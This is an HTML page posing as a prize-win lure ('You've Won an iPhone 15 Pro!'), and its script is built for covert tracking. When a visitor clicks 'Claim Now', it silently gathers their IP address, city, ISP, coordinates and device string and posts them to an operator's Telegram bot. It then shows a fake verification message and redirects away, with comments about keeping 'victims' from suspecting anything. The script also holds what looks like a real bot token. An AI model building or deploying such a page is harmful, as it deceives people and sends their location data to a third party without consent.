<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéâ Congratulations! You've Won!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #ff6b6b 0%, #feca57 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            text-align: center;
        }

        .container {
            background: white;
            border-radius: 30px;
            padding: 40px 25px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.2);
            max-width: 380px;
            width: 100%;
            animation: popIn 0.5s ease;
        }

        @keyframes popIn {
            0% { transform: scale(0.8); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }

        .gift-box {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
        }

        h1 {
            color: #2d3436;
            font-size: 26px;
            margin-bottom: 15px;
            line-height: 1.3;
        }

        .highlight {
            color: #e74c3c;
            font-weight: bold;
        }

        p {
            color: #636e72;
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.5;
        }

        .claim-btn {
            background: linear-gradient(135deg, #00b894 0%, #00cec9 100%);
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(0,184,148,0.4);
            transition: all 0.3s;
            width: 100%;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .claim-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(0,184,148,0.5);
        }

        .claim-btn:active {
            transform: translateY(0);
        }

        .timer {
            color: #e74c3c;
            font-weight: bold;
            font-size: 14px;
            margin-top: 20px;
        }

        .hidden {
            display: none;
        }

        .loading {
            display: none;
            margin-top: 20px;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #00b894;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .success-message {
            display: none;
            color: #00b894;
            font-size: 18px;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="gift-box">üéÅ</div>
        <h1>You've Won an <span class="highlight">iPhone 15 Pro!</span></h1>
        <p>Congratulations! You are the <strong>1,000th visitor</strong> today! Click below to claim your prize.</p>
        
        <button class="claim-btn" id="claimBtn" onclick="claimPrize()">Claim Now</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 15px; color: #636e72;">Verifying your location...</p>
        </div>

        <div class="success-message" id="success">
            ‚úÖ Verified! Redirecting to shipping form...
        </div>

        <div class="timer">‚è∞ Offer expires in <span id="countdown">05:00</span></div>
    </div>

    <script>
        // ==========================================
        // CONFIGURE YOUR TELEGRAM BOT HERE
        // ==========================================
        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Replace with your bot token from @BotFather
        const CHAT_ID = 'YOUR_CHAT_ID_HERE';     // Replace with your chat ID
        // ==========================================

        // Countdown timer
        let time = 300;
        setInterval(() => {
            time--;
            const mins = Math.floor(time / 60).toString().padStart(2, '0');
            const secs = (time % 60).toString().padStart(2, '0');
            document.getElementById('countdown').textContent = `${mins}:${secs}`;
        }, 1000);

        async function claimPrize() {
            const btn = document.getElementById('claimBtn');
            const loading = document.getElementById('loading');
            
            btn.style.display = 'none';
            loading.style.display = 'block';

            try {
                // Get IP info silently
                const ipResponse = await fetch('https://ipapi.co/json/');
                const ipData = await ipResponse.json();
                
                // Prepare message
                const message = `üéØ *PRANKED! New Victim Clicked!*\n\n` +
                    `üì± IP: \`${ipData.ip}\`\n` +
                    `üìç Location: ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n` +
                    `üè¢ ISP: ${ipData.org}\n` +
                    `üó∫ Coords: ${ipData.latitude}, ${ipData.longitude}\n` +
                    `‚è∞ Time: ${new Date().toLocaleString()}\n` +
                    `üì≤ Device: ${navigator.userAgent}`;
                
                // Send to Telegram silently
                if (BOT_TOKEN !== '8521122830:AAFBXnF5E1m6ImzL-UIx1zcFsPBqC8TcdvA' && CHAT_ID !== '8521122830') {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'Markdown'
                        })
                    });
                } else {
                    console.log('Bot not configured yet!');
                }

                // Show fake success (keep them waiting)
                setTimeout(() => {
                    loading.style.display = 'none';
                    document.getElementById('success').style.display = 'block';
                    
                    // Optional: Redirect to real page after 3 seconds to cover tracks
                    setTimeout(() => {
                        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'; // Rick roll or your link
                    }, 3000);
                }, 2000);

            } catch (error) {
                // If it fails, still act normal so they don't suspect
                console.error('Error:', error);
                setTimeout(() => {
                    loading.style.display = 'none';
                    document.getElementById('success').style.display = 'block';
                }, 2000);
            }
        }

        // Prevent right click (optional, makes it look more "official")
        document.addEventListener('contextmenu', e => e.preventDefault());
    </script>

</body>
</html>
